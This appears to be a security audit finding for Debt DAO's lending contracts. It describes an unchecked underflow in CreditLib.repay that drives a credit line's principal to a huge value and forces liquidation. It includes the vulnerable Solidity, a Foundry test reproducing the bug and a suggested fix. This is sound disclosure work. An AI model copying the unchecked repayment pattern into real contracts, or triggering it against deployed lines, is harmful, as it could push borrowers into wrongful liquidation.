[H-06] Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation
Submitted byberndartmueller, also found byTrust,hansfriese,adriro,0xdeadbeef0x,aphak5010, andrvierdiiev
A borrower can repay (parts) of a credit line with theSpigotedLine.useAndRepayfunction. This function will useamountofunusedTokens[credit.token]as a repayment. However, ifamountexceeds the principal and the accrued interest,credit.principalwill underflow without an error and set the principal value to a very large number.
This a problem because a borrower can unknowingly provide a larger than necessaryamountto theSpigotedLine.useAndRepayfunction to make sure enough funds are used to fully repay the principal and the remaining interest.
Additionally, a lender can do the same thing as the lender can call this function.
Impact
Thecredit.principalunderflows without an error and will be set to a very large number. This will force a secured lineimmediatelyinto liquidation. Additionally, having a principal value close to2^256 - 1will make it hugely expensive to repay the credit line.
Proof of Concept
utils/CreditLib.sol#L186
functionrepay(ILineOfCredit.Creditmemorycredit,bytes32id,uint256amount)externalreturns(ILineOfCredit.Creditmemory){unchecked{if(amount<=credit.interestAccrued) {credit.interestAccrued-=amount;credit.interestRepaid+=amount;emitRepayInterest(id,amount);returncredit;}else{uint256interest=credit.interestAccrued;uint256principalPayment=amount-interest;// update individual credit line denominated in tokencredit.principal-=principalPayment;// @audit-info potential underflow without an error due to the unchecked blockcredit.interestRepaid+=interest;credit.interestAccrued=0;emitRepayInterest(id,interest);emitRepayPrincipal(id,principalPayment);returncredit;}} }
To demonstrate the issue, copy the following test case and paste it into theSpigotedLine.t.soltest file. Then runforge test --match-test "test_lender_use_and_repay_underflow".
Following scenario causes the repayment to underflow:
Borrower borrows1 etherofrevenueToken2 etherworth ofrevenueTokenis claimed and traded from the revenue contractUse all of the previously claimed funds (2 ether) to repay the line of credit (=1 ether)credit.principalunderflows due toprincipalPaymentis larger thancredit.principal
functiontest_lender_use_and_repay_underflow()public{uint256largeRevenueAmount=lentAmount*2;deal(address(lender),lentAmount+1ether);deal(address(revenueToken),MAX_REVENUE);addressrevenueC=address(0xbeef);// need new spigot for testingbytes32id=_createCredit(address(revenueToken),Denominations.ETH,revenueC);// 1. Borrow lentAmount = 1 ether_borrow(id,lentAmount);// 2. Claim and trade largeRevenueAmount = 2 ether (revenue)bytesmemorytradeData=abi.encodeWithSignature('trade(address,address,uint256,uint256)',address(revenueToken),Denominations.ETH,1gwei,largeRevenueAmount);hoax(borrower);line.claimAndTrade(address(revenueToken),tradeData);(,uint256principalBeforeRepaying,,,,,) =line.credits(line.ids(0));assertEq(principalBeforeRepaying,lentAmount);// 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)vm.prank(lender);line.useAndRepay(largeRevenueAmount);(,uint256_principal,,,,,) =line.credits(line.ids(0));uint256underflowedPrincipal=principalBeforeRepaying;unchecked{underflowedPrincipal-= (largeRevenueAmount);}// 4. Principal underflowedassertEq(_principal,underflowedPrincipal);}
Recommended Mitigation Steps
Consider assertingamountis less or equal thancredit.principal + credit.interestAccrued(require(amount <= credit.principal + credit.interestAccrued);). Similar as how it is done inLineOfCredit.depositAndRepay()
kibagateaux (Debt DAO) confirmed